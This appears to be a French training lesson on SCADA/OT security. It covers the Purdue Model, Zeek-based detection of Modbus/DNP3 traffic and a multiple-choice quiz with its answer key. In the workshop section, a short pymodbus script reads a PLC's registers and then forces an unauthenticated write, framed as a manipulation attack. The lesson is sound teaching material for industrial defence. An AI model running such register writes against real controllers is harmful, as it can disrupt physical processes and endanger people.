# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 291 (6h) : SCADA & OT Security (Modbus TCP, DNP3, Purdue Model, Industrial Firewalls & ICS Intrusion Detection)

> [!NOTE]
> **Objectif du jour :** Maîtriser la **sécurisation des systèmes industriels (SCADA/ICS/OT)** ciblés par la certification **GICSP** (GIAC Industrial Cyber Security Professional) : comprendre l'architecture du **Purdue Model**, analyser les attaques sur les protocoles industriels non chiffrés (**Modbus TCP, DNP3**), déployer des sondes IDS industrielles (**Malcolm / Zeek**), et configurer les pare-feux industriels.
>
> **Compétences visées :** `OT-01` (A) — SCADA/ICS Purdue Model & Modbus Security | `OT-02` (A) — Industrial Threat Detection (Malcolm/Zeek)

---

## 1) Module — Modèle Purdue & Sécurité des Protocoles OT (2h)

### 📖 Narration/Intuition

Les réseaux industriels (OT - Operational Technology) gèrent les infrastructures critiques (centrales électriques, usines de traitement d'eau, chaînes de fabrication). Le **Purdue Model** segmente le réseau en 6 niveaux (Level 0 à Level 5) pour empêcher les compromissions venant du réseau IT d'atteindre les automates programmables (PLC).

```
[ Level 4-5 : IT Network / Enterprise ] ──(DMZ Industrial)──► [ Level 3 : Operations / SCADA Server ]
                                                                      │
[ Level 0-1 : Processus Physique / PLC ] ◄──(Modbus TCP / DNP3)───────┴── [ Level 2 : Control Room / HMI ]
```

---

## 2) Module — Audit et Manipulation de Modbus TCP avec Python (`modbus_audit.py`) (2h)

### 🛠️ Atelier Pratique

**Inspection et écriture de registres Modbus TCP avec `pymodbus` (`modbus_attack.py`) :**

```python
from pymodbus.client import ModbusTcpClient

# Connexion à un Automate Programmable (PLC) Modbus TCP (Port 502)
PLC_IP = "192.168.100.50"
PORT = 502

client = ModbusTcpClient(PLC_IP, port=PORT)

if client.connect():
    print(f"[+] Connecté au PLC Modbus TCP {PLC_IP}")

    # 1) Lecture des registres de maintien (Holding Registers - Ex: Température/Pression)
    result = client.read_holding_registers(address=0, count=5, slave=1)
    if not result.isError():
        print(f"[*] Valeurs des registres lus (Level 1) : {result.registers}")

    # 2) Attaque de manipulation : Écriture forcée sur un registre (Ex: Fermeture valve)
    # Vulnérabilité : Modbus TCP ne possède AUCUNE authentification ni chiffrement !
    write_res = client.write_register(address=0, value=9999, slave=1)
    if not write_res.isError():
        print("[!] REGISTRE MODBUS MODIFIÉ ! Risque physique sur le processus industriel !")

    client.close()
```

---

## 3) Module — Détection d'Anomalies ICS avec Malcolm / Zeek (2h)

```bash
# Analyse de captures PCAP industrielles Modbus/DNP3 avec Zeek IDS
zeek -r industrial_traffic.pcap modbus dnp3

# Inspection du fichier modbus.log généré par Zeek
cat modbus.log | jq '{func: .func, count: .id_orig_h}'
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **SCADA** | Supervisory Control and Data Acquisition — Système de contrôle et d'acquisition de données |
| **ICS / OT** | Industrial Control Systems / Operational Technology — Systèmes de contrôle industriels |
| **PLC** | Programmable Logic Controller — Automate programmable industriel |
| **GICSP** | GIAC Industrial Cyber Security Professional — Certification de référence en sécurité OT |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle est la vulnérabilité fondamentale du protocole industriel **Modbus TCP** (Port 502) ?
- A) Il ne possède aucun mécanisme d'authentification ni de chiffrement, permettant à quiconque ayant un accès réseau de lire et modifier les registres des automates (PLC)
- B) Il est trop lent
- C) Il nécessite un certificat SSL
- D) Il ne fonctionne que sur Windows

**Réponse : A**

**Q2 :** Dans le **Purdue Model**, à quel niveau se trouvent les automates programmables (PLC) et les capteurs/actionneurs physiques ?
- A) Level 0 (Processus physique) et Level 1 (Contrôle direct / PLC)
- B) Level 5 (Internet)
- C) Level 4 (IT Enterprise)
- D) DMZ

**Réponse : A**

**Q3 :** Quelle certification de la SANS / GIAC est la référence mondiale pour la cybersécurité des systèmes industriels (ICS/SCADA) ?
- A) GICSP (GIAC Industrial Cyber Security Professional)
- B) OSCP
- C) CEH
- D) CISSP

**Réponse : A**

**Q4 :** Quel est le rôle d'une **HMI (Human-Machine Interface)** dans un réseau industriel ?
- A) Fournir une interface graphique aux opérateurs pour surveiller et contrôler l'état des processus physiques en temps réel (Level 2)
- B) Gérer les emails d'entreprise
- C) Chiffrer la base de données
- D) Sauvegarder le code source

**Réponse : A**

**Q5 :** Quel outil open-source d'analyse de trafic réseau (Network Security Monitoring) intègre des parsers natifs pour analyser les protocoles OT (Modbus, DNP3, BACnet) ?
- A) Zeek (anciennement Bro) / Malcolm
- B) Metasploit
- C) Burp Suite
- D) Ghidra

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
